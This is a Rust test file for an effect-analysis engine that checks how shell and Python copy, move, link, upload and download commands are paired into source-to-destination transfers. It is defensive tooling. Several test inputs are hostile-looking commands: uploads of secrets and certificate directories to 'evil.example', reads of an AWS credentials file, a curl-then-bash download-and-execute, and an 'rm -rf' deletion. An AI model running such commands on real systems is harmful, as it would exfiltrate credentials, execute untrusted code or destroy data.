//! Source-to-destination transfer endpoints and their recorded pairing.
//!
//! Every modeled transfer publishes the atomic interactions a consumer can
//! select on — a read or an entry delete on the source, a write on the
//! destination — plus one `resource_transfer` edge stating which endpoint the
//! movement came from and which it reached.

use effinterp_proto::{
    AttrValue, CausalAssurance, CausalReason, CoverageLevel, Domain, Modality, OccurrenceKind,
    Plan, ResourceExpr, ResourceIdentity, Subject, validate_plan,
};

fn shell(source: &str) -> Plan {
    plan(Subject::Shell {
        source: source.to_string(),
        cwd: Some("/w".to_string()),
        context: Default::default(),
    })
}

fn python(source: &str) -> Plan {
    plan(Subject::Source {
        dialect: None,
        language: "python".into(),
        source: source.to_string(),
        cwd: Some("/w".to_string()),
        context: Default::default(),
    })
}

fn plan(subject: Subject) -> Plan {
    let plan = effinterp_engine::Engine::new()
        .with_causality_detail(true)
        .analyze(&subject)
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|error| panic!("invalid plan for {subject:?}: {error:?}"));
    plan
}

struct ObservedPaths {
    facts: std::collections::BTreeMap<String, effinterp_proto::ObservationOutcome>,
    listings: std::collections::BTreeMap<String, effinterp_proto::ObservationOutcome>,
}

impl ObservedPaths {
    fn new(
        facts: impl IntoIterator<Item = (&'static str, effinterp_proto::ObservationOutcome)>,
    ) -> std::sync::Arc<Self> {
        Self::listed(facts, [])
    }

    /// Path facts, and the entries each listed directory holds.
    fn listed(
        facts: impl IntoIterator<Item = (&'static str, effinterp_proto::ObservationOutcome)>,
        listings: impl IntoIterator<
            Item = (&'static str, Vec<(&'static str, effinterp_proto::PathKind)>),
        >,
    ) -> std::sync::Arc<Self> {
        std::sync::Arc::new(Self {
            facts: facts
                .into_iter()
                .map(|(path, outcome)| (path.to_string(), outcome))
                .collect(),
            listings: listings
                .into_iter()
                .map(|(directory, entries)| {
                    let listing = effinterp_proto::ListingFact {
                        directory: directory.into(),
                        entries: entries
                            .into_iter()
                            .map(|(path, kind)| effinterp_proto::ListedEntry {
                                path: path.into(),
                                kind,
                            })
                            .collect(),
                    };
                    (
                        directory.to_string(),
                        effinterp_proto::ObservationOutcome::Listing(listing),
                    )
                })
                .collect(),
        })
    }
}

impl effinterp_engine::ObservationResolver for ObservedPaths {
    fn observe(
        &self,
        query: &effinterp_proto::ObservationQuery,
        _budget: effinterp_engine::ObservationBudget,
    ) -> effinterp_proto::ObservationOutcome {
        let (facts, path, depth) = match query {
            effinterp_proto::ObservationQuery::Path { path } => (&self.facts, path, None),
            effinterp_proto::ObservationQuery::Listing { path, depth } => {
                (&self.listings, path, *depth)
            }
        };
        match facts.get(path).cloned() {
            // A listing answers only down to the depth asked.
            Some(effinterp_proto::ObservationOutcome::Listing(mut listing)) => {
                listing.entries.retain(|entry| {
                    depth.is_none_or(|depth| entry.path.split('/').count() <= depth as usize)
                });
                effinterp_proto::ObservationOutcome::Listing(listing)
            }
            Some(outcome) => outcome,
            None => effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            ),
        }
    }
}

fn observed_entry(
    path: &str,
    kind: effinterp_proto::PathKind,
) -> effinterp_proto::ObservationOutcome {
    effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
        entry: path.into(),
        kind,
        followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
            path: path.into(),
            kind: effinterp_proto::Fact::Known(kind),
        }),
        executable: None,
    })
}

fn observed_shell(source: &str, observations: &std::sync::Arc<ObservedPaths>) -> Plan {
    let plan = effinterp_engine::Engine::new()
        .with_causality_detail(true)
        .analyze_with_observations(
            &Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            },
            None,
            None,
            Some(observations.clone() as std::sync::Arc<dyn effinterp_engine::ObservationResolver>),
        )
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|error| panic!("invalid plan for {source:?}: {error:?}"));
    plan
}

fn content_reads_by(plan: &Plan, executable: &str) -> Vec<String> {
    plan.effects
        .iter()
        .filter(|effect| {
            effect.operation.as_str() == "filesystem.read"
                && effect.attributes.get("access_purpose")
                    == Some(&AttrValue::String("program_input".into()))
                && matches!(
                    &plan.execution_graph.nodes[effect.execution.0 as usize].subject,
                    Subject::Exec { argv, .. }
                        if argv.first().is_some_and(|program| program == executable)
                )
        })
        .map(|effect| path_of(&effect.resource))
        .collect()
}

/// Each recorded transfer as `(source operation, source path, destination
/// operation, destination path)`, sorted: plan edge order follows occurrence
/// identity, which carries no meaning of its own. A symbolic endpoint renders
/// as the empty string, so a test can still assert the known side.
fn transfers(plan: &Plan) -> Vec<(String, String, String, String)> {
    let interactions: std::collections::BTreeMap<_, _> = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction {
                operation,
                resource,
                ..
            } => Some((node.id.clone(), (operation.0.clone(), path_of(resource)))),
            _ => None,
        })
        .collect();
    plan.causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .filter(|edge| edge.reason == CausalReason::ResourceTransfer)
        .map(|edge| {
            let (source_op, source) = interactions[&edge.from].clone();
            let (destination_op, destination) = interactions[&edge.to].clone();
            (source_op, source, destination_op, destination)
        })
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect()
}

fn value_dependencies(plan: &Plan) -> Vec<(String, String, String, String)> {
    let graph = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required");
    let interactions: std::collections::BTreeMap<_, _> = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction {
                operation,
                resource,
                ..
            } => Some((node.id.clone(), (operation.0.clone(), path_of(resource)))),
            _ => None,
        })
        .collect();
    graph
        .edges
        .iter()
        .filter(|edge| edge.reason == CausalReason::ValueDependency)
        .filter_map(|edge| {
            let (source_op, source) = interactions.get(&edge.from)?.clone();
            let (destination_op, destination) = interactions.get(&edge.to)?.clone();
            Some((source_op, source, destination_op, destination))
        })
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect()
}

fn path_of(resource: &ResourceExpr) -> String {
    match resource {
        ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path },
        } => path.clone(),
        ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint { host, path, .. },
        } => format!("{host}{}", path.clone().unwrap_or_default()),
        _ => String::new(),
    }
}

fn operations(plan: &Plan) -> Vec<String> {
    plan.effects
        .iter()
        .map(|effect| effect.operation.0.clone())
        .collect()
}

/// Acceptance 1: a copy reads its source and writes its destination, in every
/// language and command form, and never deletes the source.
#[test]
fn copies_read_the_source_and_write_the_destination_without_deleting_it() {
    for plan in [
        shell("cp /w/a.txt /w/b.txt"),
        python("import shutil\nshutil.copy('/w/a.txt', '/w/b.txt')\n"),
    ] {
        assert_eq!(
            transfers(&plan),
            vec![(
                "filesystem.read".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/b.txt".to_string(),
            )],
        );
        assert!(
            !operations(&plan).iter().any(|op| op == "filesystem.delete"),
            "a copy leaves the source in place: {:?}",
            operations(&plan)
        );
    }
}

#[test]
fn cp_transfer_stays_conservative_without_observed_destination_identity() {
    for source in ["cp /w/a.txt /w/b.txt", "cp -t /w/out /w/a.txt"] {
        let plan = shell(source);
        let transfers = plan
            .causality
            .graph
            .as_ref()
            .unwrap()
            .edges
            .iter()
            .filter(|edge| edge.reason == CausalReason::ResourceTransfer)
            .collect::<Vec<_>>();
        assert!(!transfers.is_empty(), "{source}");
        assert!(
            transfers
                .iter()
                .all(|edge| edge.assurance == CausalAssurance::Conservative),
            "{source}"
        );
    }

    for source in [
        "cp --link /w/a.txt /w/b.txt",
        "cp -s /w/a.txt /w/b.txt",
        "cp --attributes-only /w/a.txt /w/b.txt",
        "cp --unknown /w/a.txt /w/b.txt",
        "cp -T /w/a.txt /w/b.txt /w/c.txt",
        "cp -T -t /w/out /w/a.txt",
    ] {
        assert!(transfers(&shell(source)).is_empty(), "{source}");
    }
}

#[test]
fn copying_and_linking_tools_pair_their_own_operands() {
    // `dd` copies its input operand to its output operand, and a hard link
    // gives the source file a second entry: both leave the destination
    // holding the source's bytes, so a later reader of the destination
    // depends on whatever produced the source.
    assert_eq!(
        transfers(&shell("dd if=/w/a.txt of=/w/b.txt")),
        vec![(
            "filesystem.read".to_string(),
            "/w/a.txt".to_string(),
            "filesystem.write".to_string(),
            "/w/b.txt".to_string(),
        )],
    );
    assert_eq!(
        transfers(&shell("ln /w/a.txt /w/b.txt")),
        vec![(
            "filesystem.read".to_string(),
            "/w/a.txt".to_string(),
            "filesystem.create".to_string(),
            "/w/b.txt".to_string(),
        )],
    );
    // One SOURCE and one LINK_NAME admit no other pairing, so the two-operand
    // hard link is exact; forms that compute their link names stay
    // conservative.
    for (source, assurance) in [
        ("ln /w/a.txt /w/b.txt", CausalAssurance::Exact),
        ("ln -T /w/a.txt /w/b.txt", CausalAssurance::Exact),
        ("ln /w/a.txt", CausalAssurance::Conservative),
        ("ln -t /w/d /w/a.txt", CausalAssurance::Conservative),
        ("ln /w/a.txt /w/b.txt /w/d", CausalAssurance::Conservative),
        ("ln /w/*.txt /w/d", CausalAssurance::Conservative),
    ] {
        let assurances = shell(source)
            .causality
            .graph
            .unwrap()
            .edges
            .into_iter()
            .filter(|edge| edge.reason == CausalReason::ResourceTransfer)
            .map(|edge| edge.assurance)
            .collect::<std::collections::BTreeSet<_>>();
        assert_eq!(assurances, [assurance].into(), "{source}");
    }
    // A symbolic link stores a name; it neither reads nor carries the source.
    assert!(transfers(&shell("ln -s /w/a.txt /w/b.txt")).is_empty());
    assert!(
        !operations(&shell("ln -s /w/a.txt /w/b.txt"))
            .iter()
            .any(|operation| operation == "filesystem.read")
    );
    // Only the operand that names a file is paired: an input without an
    // output, or a link source without a destination, pairs nothing.
    assert!(transfers(&shell("dd if=/w/a.txt")).is_empty());
    assert!(transfers(&shell("dd of=/w/b.txt")).is_empty());
}

/// Acceptance 1: a proven rename moves the directory entry — the source entry
/// is deleted and the destination entry written under the existing
/// `filesystem.move` layer. `rename(2)` reads no content; shell `mv` may copy
/// the contents when the destination is on another file system, so it carries
/// a possible source read beside the same entry transfer.
#[test]
fn renames_delete_the_source_entry_and_write_the_destination() {
    for plan in [
        shell("mv /w/a.txt /w/b.txt"),
        python("import os\nos.rename('/w/a.txt', '/w/b.txt')\n"),
    ] {
        assert_eq!(
            transfers(&plan),
            vec![(
                "filesystem.delete".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/b.txt".to_string(),
            )],
        );
        assert!(operations(&plan).iter().any(|op| op == "filesystem.move"));
    }
    let operations = operations(&python("import os\nos.rename('/w/a.txt', '/w/b.txt')\n"));
    assert!(
        !operations.iter().any(|op| op == "filesystem.read"),
        "a metadata-only rename reads no content: {operations:?}"
    );
}

/// Acceptance 1: a general move utility may copy across filesystems, so it adds
/// a possible source read alongside the same entry mutation. The read is
/// distinguishable from the entry transfer by its own pairing.
#[test]
fn general_moves_add_a_possible_copy_path_beside_the_entry_transfer() {
    let plan = python("import shutil\nshutil.move('/w/a.txt', '/w/b.txt')\n");
    assert_eq!(
        transfers(&plan),
        vec![
            (
                "filesystem.delete".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/b.txt".to_string(),
            ),
            (
                "filesystem.read".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/b.txt".to_string(),
            ),
        ],
    );
}

#[test]
fn a_successful_move_carries_observed_content_identity_to_a_later_read() {
    let credential = "/home/test/.aws/credentials";
    let observations = ObservedPaths::new([(
        credential,
        observed_entry(credential, effinterp_proto::PathKind::File),
    )]);
    let plan = observed_shell(
        "mv /home/test/.aws/credentials moved && cat moved",
        &observations,
    );

    assert_eq!(content_reads_by(&plan, "cat"), [credential]);
    assert!(plan.coverage.is_full(&Domain::new("filesystem")));
    assert!(plan.boundaries.iter().all(|boundary| {
        boundary.reason != effinterp_proto::BoundaryReason::OBSERVATION_UNAVAILABLE
    }));
}

#[test]
fn a_move_without_a_source_observation_invents_no_identity() {
    let observations = ObservedPaths::new([]);
    let plan = observed_shell(
        "mv /home/test/.aws/credentials moved && cat moved",
        &observations,
    );

    assert_eq!(content_reads_by(&plan, "cat"), ["/w/moved"]);
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason == effinterp_proto::BoundaryReason::OBSERVATION_UNAVAILABLE
            && boundary.domains == [Domain::new("filesystem")]
    }));
    assert!(!plan.coverage.is_full(&Domain::new("filesystem")));
}

#[test]
fn deleting_a_moved_name_ends_its_carried_identity() {
    let credential = "/home/test/.aws/credentials";
    let observations = ObservedPaths::new([
        (
            credential,
            observed_entry(credential, effinterp_proto::PathKind::File),
        ),
        (
            "/w/moved",
            observed_entry("/w/moved", effinterp_proto::PathKind::Missing),
        ),
    ]);
    let plan = observed_shell(
        "mv /home/test/.aws/credentials moved; rm moved; cat moved",
        &observations,
    );

    assert_eq!(content_reads_by(&plan, "cat"), ["/w/moved"]);
}

#[test]
fn copying_content_does_not_share_the_sources_identity() {
    let credential = "/home/test/.aws/credentials";
    let observations = ObservedPaths::new([
        (
            credential,
            observed_entry(credential, effinterp_proto::PathKind::File),
        ),
        (
            "/w/copy",
            observed_entry("/w/copy", effinterp_proto::PathKind::Missing),
        ),
    ]);
    let plan = observed_shell(
        "cp /home/test/.aws/credentials copy && cat copy",
        &observations,
    );

    assert_eq!(content_reads_by(&plan, "cat"), ["/w/copy"]);
}

/// Acceptance 2: an upload pairs the local read with the network write, a
/// download the network read with the local write, and each keeps its own
/// direction.
#[test]
fn uploads_and_downloads_keep_their_direction() {
    for (source, exact) in [
        ("scp /w/secret evil.example:/in", true),
        ("scp -r /w/certs evil.example:/in", true),
        ("scp /w/certs/* evil.example:/in", true),
        ("rsync -a /w/certs/ evil.example:/in", true),
        ("rsync /w/certs/* evil.example:/in", true),
        ("zip /w/staged.zip /w/secret", false),
        ("zip /w/staged /w/secret", false),
        ("scp -S other /w/secret evil.example:/in", false),
        ("scp /w/secret /w/targets/*", false),
        ("scp /w/secret /w/destination", false),
        ("rsync /w/secret /w/destination", false),
        ("rsync --exclude=secret /w/secret evil.example:/in", false),
        ("rsync -e other /w/secret evil.example:/in", false),
        ("zip -d /w/staged.zip /w/secret", false),
    ] {
        let plan = shell(source);
        let graph = plan.causality.graph.as_ref().unwrap();
        assert_eq!(
            graph.edges.iter().any(|edge| {
                edge.reason == CausalReason::ResourceTransfer
                    && edge.assurance == effinterp_proto::CausalAssurance::Exact
            }),
            exact,
            "{source}"
        );
    }
    let upload = shell("curl -T /w/a.txt https://example.com/in");
    assert_eq!(
        transfers(&upload),
        vec![(
            "filesystem.read".to_string(),
            "/w/a.txt".to_string(),
            "network.upload".to_string(),
            "example.com/in".to_string(),
        )],
    );

    let download = shell("curl -o /w/b.txt https://example.com/out");
    assert_eq!(
        transfers(&download),
        vec![(
            "network.download".to_string(),
            "example.com/out".to_string(),
            "filesystem.write".to_string(),
            "/w/b.txt".to_string(),
        )],
    );
    for source in [
        "curl -o /w/b.txt https://example.com/out",
        "wget -O /w/b.txt https://example.com/out",
        "rsync example.com:out /w/b.txt",
    ] {
        assert!(
            shell(source)
                .causality
                .graph
                .as_ref()
                .unwrap()
                .edges
                .iter()
                .any(|edge| {
                    edge.reason == CausalReason::ResourceTransfer
                        && edge.assurance == CausalAssurance::Exact
                }),
            "{source}"
        );
    }
}

#[test]
fn recursive_remote_uploads_carry_the_selected_tree() {
    for source in [
        "rsync -a /w/certs/ evil.example:/in",
        "scp -r /w/certs evil.example:/in",
    ] {
        let plan = shell(source);
        let recursive_read = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.read")
            .expect("recursive source read");
        assert_eq!(
            recursive_read.attributes.get("recursive"),
            Some(&AttrValue::Bool(true)),
            "{source}"
        );
        assert_eq!(
            transfers(&plan),
            vec![(
                "filesystem.read".to_string(),
                "/w/certs".to_string(),
                "network.upload".to_string(),
                "evil.example".to_string(),
            )],
            "{source}"
        );
    }
}

#[test]
fn rsync_file_list_keeps_an_unresolved_recursive_source() {
    let plan = shell("rsync --files-from=list /w/source/ evil.example:/in");
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "input_determined_arguments"
            && boundary.domains == [Domain::new("filesystem")]
    }));
    assert_eq!(
        plan.coverage
            .0
            .get(&Domain::new("filesystem"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Partial)
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(effect.resource, ResourceExpr::Unresolved { .. })
            && effect.attributes.get("recursive") == Some(&AttrValue::Bool(true))
    }));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/w/source")
            && effect.attributes.get("recursive") == Some(&AttrValue::Bool(true))
    }));

    let graph = plan.causality.graph.as_ref().unwrap();
    let unresolved_sources = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction {
                operation,
                resource: ResourceExpr::Unresolved { .. },
                ..
            } if operation.0 == "filesystem.read" => Some(&node.id),
            _ => None,
        })
        .collect::<Vec<_>>();
    assert!(graph.edges.iter().any(|edge| {
        edge.reason == CausalReason::ResourceTransfer
            && unresolved_sources.contains(&&edge.from)
            && graph.nodes.iter().any(|node| {
                node.id == edge.to
                    && matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == "network.upload")
            })
    }));
}

#[test]
fn wget_pairs_upload_bodies_without_pairing_cookie_reads() {
    for body_flag in ["--post-file", "--body-file"] {
        for separator in ["=", " "] {
            let body = format!("{body_flag}{separator}/w/body.txt");
            let cookies = format!("--load-cookies{separator}/w/cookies.txt");
            for flags in [format!("{cookies} {body}"), format!("{body} {cookies}")] {
                for paths in [vec!["/in"], vec!["/in", "/other"]] {
                    let urls = paths
                        .iter()
                        .map(|path| format!("https://example.com{path}"))
                        .collect::<Vec<_>>()
                        .join(" ");
                    let source = format!("wget {flags} {urls}");
                    let plan = shell(&source);
                    assert_eq!(
                        transfers(&plan),
                        paths
                            .iter()
                            .map(|path| (
                                "filesystem.read".to_string(),
                                "/w/body.txt".to_string(),
                                "network.upload".to_string(),
                                format!("example.com{path}"),
                            ))
                            .collect::<Vec<_>>(),
                        "{source}",
                    );
                    for path in ["/w/body.txt", "/w/cookies.txt"] {
                        assert!(
                            plan.effects.iter().any(|effect| {
                                effect.operation.0 == "filesystem.read"
                                    && path_of(&effect.resource) == path
                            }),
                            "missing read of {path}: {source}"
                        );
                    }
                }
            }
        }
    }
}

/// Acceptance 2: a server-side object copy is a read and a write in the cloud
/// scope. No client payload upload or download is invented for it.
#[test]
fn server_side_object_copy_invents_no_client_transfer() {
    let plan = shell("aws s3 cp s3://bucket/a s3://bucket/b");
    assert_eq!(
        transfers(&plan),
        vec![(
            "cloud.object.read".to_string(),
            String::new(),
            "cloud.object.write".to_string(),
            String::new(),
        )],
    );
    let operations = operations(&plan);
    assert!(
        !operations
            .iter()
            .any(|op| op == "network.upload" || op == "network.download"),
        "a server-side copy moves no client payload: {operations:?}"
    );
}

/// Archive encoding is a value dependency, not a content-preserving copy.
#[test]
fn archive_creation_is_not_a_content_preserving_transfer() {
    let create = shell("tar -cf /w/out.tar /w/a.txt /w/b.txt");
    assert!(transfers(&create).is_empty());
    assert_eq!(
        value_dependencies(&create),
        vec![
            (
                "filesystem.read".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/out.tar".to_string(),
            ),
            (
                "filesystem.read".to_string(),
                "/w/b.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/out.tar".to_string(),
            ),
        ],
    );

    let extract = shell("tar -xf /w/out.tar -C /w/dest");
    assert!(transfers(&extract).is_empty());

    let zip = shell("zip -q /w/out.zip /w/a.txt /w/b.txt");
    assert!(transfers(&zip).is_empty());
    assert_eq!(
        value_dependencies(&zip),
        vec![
            (
                "filesystem.read".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/out.zip".to_string(),
            ),
            (
                "filesystem.read".to_string(),
                "/w/b.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/out.zip".to_string(),
            ),
        ],
    );
}

/// Acceptance 2: a known endpoint survives a symbolic opposite endpoint — a
/// symbolic remote never erases the local side's proven effect or its pairing.
#[test]
fn a_symbolic_endpoint_preserves_the_known_endpoint() {
    let plan = shell("scp /w/a.txt user@$HOST:/tmp/");
    let transfers = transfers(&plan);
    assert_eq!(transfers.len(), 1);
    assert_eq!(transfers[0].0, "filesystem.read");
    assert_eq!(transfers[0].1, "/w/a.txt");
    assert_eq!(transfers[0].2, "network.upload");
}

/// Acceptance 2: an ambiguous directory destination invents no concrete child
/// path, and multiple operands keep their own pairing instead of an
/// unrestricted product across them.
#[test]
fn multiple_sources_pair_with_the_shared_destination_without_inventing_children() {
    let plan = shell("cp /w/a.txt /w/b.txt /w/dest");
    assert_eq!(
        transfers(&plan),
        vec![
            (
                "filesystem.read".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/dest".to_string(),
            ),
            (
                "filesystem.read".to_string(),
                "/w/b.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/dest".to_string(),
            ),
        ],
    );
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| path_of(&effect.resource).starts_with("/w/dest/")),
        "the destination directory's children are not known"
    );
}

/// Acceptance 3: interleaved transfers with different pairs keep their own
/// endpoints; no edge crosses between the two.
#[test]
fn interleaved_transfers_do_not_cross_their_pairs() {
    let plan = python(
        "import shutil\n\
         shutil.copy('/w/a.txt', '/w/a.bak')\n\
         shutil.copy('/w/b.txt', '/w/b.bak')\n",
    );
    assert_eq!(
        transfers(&plan),
        vec![
            (
                "filesystem.read".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/a.bak".to_string(),
            ),
            (
                "filesystem.read".to_string(),
                "/w/b.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/b.bak".to_string(),
            ),
        ],
    );
}

/// Acceptance 3: two identical calls collapse only where their occurrences are
/// themselves identical. The pairing survives and no edge crosses to an
/// unrelated endpoint.
#[test]
fn repeated_identical_calls_keep_one_pairing_per_distinct_occurrence_pair() {
    let plan = python(
        "import shutil\n\
         shutil.copy('/w/a.txt', '/w/b.txt')\n\
         shutil.copy('/w/a.txt', '/w/b.txt')\n",
    );
    assert_eq!(
        transfers(&plan),
        vec![(
            "filesystem.read".to_string(),
            "/w/a.txt".to_string(),
            "filesystem.write".to_string(),
            "/w/b.txt".to_string(),
        )],
    );
}

/// Acceptance 3: mutually exclusive branches keep each branch's own pairing
/// under its own guard, and the two never pair with each other.
#[test]
fn exclusive_branches_keep_their_own_pairings_and_guards() {
    let plan = python(
        "import shutil, os\n\
         if os.environ.get('MODE') == 'x':\n\
         \x20   shutil.copy('/w/a.txt', '/w/a.bak')\n\
         else:\n\
         \x20   shutil.copy('/w/b.txt', '/w/b.bak')\n",
    );
    assert_eq!(
        transfers(&plan),
        vec![
            (
                "filesystem.read".to_string(),
                "/w/a.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/a.bak".to_string(),
            ),
            (
                "filesystem.read".to_string(),
                "/w/b.txt".to_string(),
                "filesystem.write".to_string(),
                "/w/b.bak".to_string(),
            ),
        ],
    );
    for edge in plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .filter(|edge| edge.reason == CausalReason::ResourceTransfer)
    {
        assert_eq!(edge.modality, Modality::May);
    }
}

/// Acceptance 3: `ResourceTransition` keeps its exclusive meaning — successive
/// state interactions with one resource — and a transfer never displaces it.
#[test]
fn successive_interactions_with_one_resource_stay_a_transition() {
    let plan = python(
        "import shutil\n\
         shutil.copy('/w/a.txt', '/w/b.txt')\n\
         open('/w/b.txt').read()\n",
    );
    let transitions: Vec<_> = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .filter(|edge| edge.reason == CausalReason::ResourceTransition)
        .collect();
    assert!(
        !transitions.is_empty(),
        "the written and re-read destination is a state transition"
    );
    assert_eq!(transfers(&plan).len(), 1);

    for source in [
        "curl -o payload.sh https://example.com/out && bash payload.sh",
        "wget -O payload.sh https://example.com/out && bash payload.sh",
        "rsync example.com:out payload.sh && bash payload.sh",
    ] {
        assert!(
            shell(source)
                .causality
                .graph
                .as_ref()
                .unwrap()
                .edges
                .iter()
                .any(|edge| {
                    edge.reason == CausalReason::ResourceTransition
                        && edge.assurance == CausalAssurance::Exact
                        && edge.condition.is_some()
                }),
            "{source}"
        );
    }

    for source in [
        "curl -o payload.sh https://example.com/out; bash payload.sh",
        "curl -o payload.sh https://example.com/out && cp /w/other \"$TARGET\" && bash payload.sh",
    ] {
        assert!(
            shell(source)
                .causality
                .graph
                .as_ref()
                .unwrap()
                .edges
                .iter()
                .filter(|edge| edge.reason == CausalReason::ResourceTransition)
                .all(|edge| edge.assurance == CausalAssurance::Conservative),
            "{source}"
        );
    }
}

#[test]
fn guarded_rename_endpoints_keep_their_transfer_and_condition() {
    for (language, source) in [
        (
            "go",
            "package main\nimport \"os\"\nfunc main() { if flag { os.Rename(\"/w/a\", \"/w/b\") } }",
        ),
        ("php", "<?php if ($flag) { rename('/w/a', '/w/b'); }"),
        ("ruby", "if flag\n File.rename('/w/a', '/w/b')\nend\n"),
    ] {
        let plan = plan(Subject::Source {
            dialect: None,
            language: language.into(),
            source: source.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        });
        assert_eq!(
            transfers(&plan),
            vec![(
                "filesystem.delete".into(),
                "/w/a".into(),
                "filesystem.write".into(),
                "/w/b".into(),
            )],
            "{language}"
        );
        let edge = plan
            .causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .iter()
            .find(|edge| edge.reason == CausalReason::ResourceTransfer)
            .unwrap();
        let guard = edge.condition.as_ref().expect(language);
        assert!(!guard.atoms().is_empty(), "{language}");
        for operation in ["filesystem.delete", "filesystem.write"] {
            let effect = plan
                .effects
                .iter()
                .find(|effect| effect.operation.0 == operation)
                .unwrap();
            assert_eq!(
                effect.condition.as_ref().unwrap().identity_key(),
                guard.identity_key(),
                "{language}"
            );
        }
    }
}

#[test]
fn parent_traversal_follows_an_observed_link() {
    let deleted = |command: &str, observations: &std::sync::Arc<ObservedPaths>| {
        let plan = observed_shell(command, observations);
        let deleted = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.as_str() == "filesystem.delete")
            .map(|effect| path_of(&effect.resource))
            .collect::<Vec<_>>();
        let unobserved = plan.boundaries.iter().any(|boundary| {
            boundary.reason == effinterp_proto::BoundaryReason::OBSERVATION_UNAVAILABLE
        });
        (deleted, unobserved)
    };
    let command = "rm -rf /var/tmp/x/entry/../db";
    let link_to = |kind| {
        ObservedPaths::new([(
            "/var/tmp/x/entry",
            effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
                entry: "/var/tmp/x/entry".into(),
                kind: effinterp_proto::PathKind::Symlink,
                followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
                    path: "/var/tmp".into(),
                    kind: effinterp_proto::Fact::Known(kind),
                }),
                executable: None,
            }),
        )])
    };
    // `link/..` is the parent of the link's target.
    assert_eq!(
        deleted(command, &link_to(effinterp_proto::PathKind::Directory)),
        (vec!["/var/db".to_string()], false)
    );
    let directory = ObservedPaths::new([(
        "/var/tmp/x/entry",
        observed_entry("/var/tmp/x/entry", effinterp_proto::PathKind::Directory),
    )]);
    assert_eq!(
        deleted(command, &directory),
        (vec!["/var/tmp/x/db".to_string()], false)
    );
    // A file, a missing entry, or a link to either fails the lookup, so the
    // operand names nothing to delete.
    for observations in [
        link_to(effinterp_proto::PathKind::File),
        link_to(effinterp_proto::PathKind::Missing),
        ObservedPaths::new([(
            "/var/tmp/x/entry",
            observed_entry("/var/tmp/x/entry", effinterp_proto::PathKind::File),
        )]),
        ObservedPaths::new([(
            "/var/tmp/x/entry",
            observed_entry("/var/tmp/x/entry", effinterp_proto::PathKind::Missing),
        )]),
    ] {
        assert_eq!(deleted(command, &observations), (vec![], false));
    }
    // An unanswered entry leaves the deleted identity unresolved.
    assert_eq!(
        deleted(command, &ObservedPaths::new([])),
        (vec![String::new()], true)
    );
    // A link this command created is followed before the host is asked,
    // whose answer about the link's path predates it.
    let target = ObservedPaths::new([(
        "/var/tmp",
        observed_entry("/var/tmp", effinterp_proto::PathKind::Directory),
    )]);
    assert_eq!(
        deleted(
            "ln -s /var/tmp /var/tmp/x/entry; rm -rf /var/tmp/x/entry/../db",
            &target
        ),
        (vec!["/var/db".to_string()], false)
    );
}

#[test]
fn powershell_copy_lands_where_the_observed_destination_says() {
    let writes = |observations: &std::sync::Arc<ObservedPaths>| {
        observed_shell("pwsh -Command 'Copy-Item /w/a /d'", observations)
            .effects
            .iter()
            .filter(|effect| effect.operation.as_str() == "filesystem.write")
            .map(|effect| path_of(&effect.resource))
            .collect::<Vec<_>>()
    };
    let directory = ObservedPaths::new([(
        "/d",
        observed_entry("/d", effinterp_proto::PathKind::Directory),
    )]);
    assert_eq!(writes(&directory), ["/d", "/d/a"]);
    let missing = ObservedPaths::new([(
        "/d",
        observed_entry("/d", effinterp_proto::PathKind::Missing),
    )]);
    assert_eq!(writes(&missing), ["/d"]);
    // A move onto an existing entry fails, replaces a file under -Force, or
    // across volumes merges a directory: only the replaced file lands. A
    // moved directory brings what the host lists beneath it, here nothing.
